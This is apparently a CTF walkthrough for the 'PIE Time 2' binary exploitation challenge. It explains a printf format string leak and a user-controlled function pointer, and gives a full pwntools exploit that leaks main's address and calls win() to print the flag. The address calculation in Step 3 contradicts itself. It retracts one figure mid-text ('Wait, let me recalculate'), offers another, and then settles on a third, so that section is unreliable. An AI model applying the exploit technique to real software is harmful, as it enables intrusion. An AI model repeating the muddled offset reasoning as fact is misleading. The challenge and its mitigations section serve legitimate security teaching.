# PIE Time 2 - CTF Walkthrough

## Challenge Overview
This is a binary exploitation challenge that involves bypassing PIE (Position Independent Executable) protection to execute a win function that reads and prints the flag.

## Binary Information
```
File: vuln (ELF 64-bit LSB pie executable)
Architecture: x86-64
Protections:
  - PIE: Enabled
  - NX: Enabled
  - Stack Canary: Enabled
  - Full RELRO: Enabled
  - SHSTK: Enabled
  - IBT: Enabled
```

## Source Code Analysis

The vulnerable program has three main components:

1. **main()**: Sets up a SIGSEGV handler and calls `call_functions()`
2. **call_functions()**: Contains the vulnerabilities
3. **win()**: The target function that reads and prints the flag

### Vulnerabilities

#### 1. Format String Vulnerability
```c
printf(buffer);  // Direct use of user input in printf
```
This allows us to leak stack values and potentially leak addresses to defeat PIE.

#### 2. Arbitrary Function Call
```c
scanf("%lx", &val);
void (*foo)(void) = (void (*)())val;
foo();
```
The program allows us to input an address and then calls it as a function pointer. This gives us arbitrary code execution if we know the address.

## Exploitation Strategy

Since PIE is enabled, all code addresses are randomized at runtime. However, we can:
1. Use the format string vulnerability to leak an address from the stack
2. Calculate the base address and the `win()` function address
3. Provide the `win()` address to jump to it

## Step-by-Step Exploitation

### Step 1: Find the Format String Offset

We need to find which offset on the stack contains a code address we can use to calculate PIE base.

```python
for i in range(50):
    p = process()
    payload = f"%{i}$p".encode()
    p.sendline(payload)
    p.recvline()
    p.close()
```

By testing various offsets, we find that offset 23 (`%23$p`) leaks an address in the binary.

### Step 2: Identify the Leaked Address

Using GDB or by analyzing the binary:
```bash
objdump -d vuln | grep main
```

We find that `main()` is at offset `0x1400` from the binary base.

The leaked address at offset 23 points to a location in `main()`. By examining the stack or through testing, we determine the leaked address is `main + 0x96`.

### Step 3: Calculate win() Address

From objdump:
```bash
objdump -d vuln | grep win
# Output shows: 000000000000136a <win>:
```

The `win()` function is at offset `0x136a` from the binary base.

If we leak an address at `main + 0x96` = `0x1496`, we can calculate:
```
win_address = leaked_address - 0x96 - 0x1400 + 0x136a
            = leaked_address - 0x96
            (since main is at 0x1400 and win at 0x136a, difference is -0x96)
```

Actually, simpler calculation:
```
leaked_address = main + 0x96 = 0x1496 (relative to PIE base)
win_address = leaked_address - 0x96 - 0x36 = leaked_address - 0x12c

Wait, let me recalculate:
main at 0x1400
win at 0x136a
leaked is at main + 0x96 = 0x1496

So: win = leaked - (0x1496 - 0x136a) = leaked - 0x12c
```

But the exploit shows: `win_addr = main_addr - 0x96`

This means the leaked address is actually pointing to something after win. Let me verify:
```
If leaked = 0x1400 (main address)
Then win = 0x1400 - 0x96 = 0x136a ✓
```

So the leaked address at offset 23 is the exact address of `main()`.

### Step 4: Complete Exploit

```python
from pwn import *

elf = context.binary = ELF("./vuln")
context.log_level = 'debug'

def exploit():
    p = process()
    
    # Leak main address using format string
    p.sendlineafter(b"name:", b"%23$p")
    main_addr = int(p.recvline(), 16)
    log.success(f"Leaked main address: {hex(main_addr)}")
    
    # Calculate win address
    # win is at offset 0x136a, main is at 0x1400
    # Difference: 0x136a - 0x1400 = -0x96
    win_addr = main_addr - 0x96
    log.success(f"Win address at: {hex(win_addr)}")
    
    # Send win address to jump to
    p.sendlineafter(b"0x12345: ", hex(win_addr).encode())
    
    # Get the flag
    p.interactive()

if __name__ == '__main__':
    exploit()
```

## Running the Exploit

```bash
python3 exploit.py
```

Expected output:
```
[+] Leaked main address: 0x7f...1400
[+] Win address at: 0x7f...136a
You won!
CTF{your_flag_here}
```

## Key Concepts

1. **PIE Bypass**: We defeat PIE by leaking a code address and calculating offsets
2. **Format String**: `printf(buffer)` allows us to read arbitrary stack values
3. **Function Pointer Call**: The program's design allows arbitrary code execution once we know an address
4. **Address Calculation**: Understanding relative offsets in the binary is crucial

## Defense Mechanisms Bypassed

- **PIE**: Bypassed via format string leak
- **Stack Canary**: Not relevant (no buffer overflow on stack)
- **NX**: Not relevant (we're calling existing code)
- **RELRO**: Not relevant (not modifying GOT)

## Mitigation

To fix this vulnerability:
1. Use `printf("%s", buffer)` instead of `printf(buffer)`
2. Don't allow user-controlled function pointers
3. Implement additional ASLR entropy
4. Use Control Flow Integrity (CFI) mechanisms

## Tools Used
- **pwntools**: Python exploitation framework
- **GDB**: Debugging and address identification
- **objdump**: Binary analysis and offset calculation
- **checksec**: Security feature identification
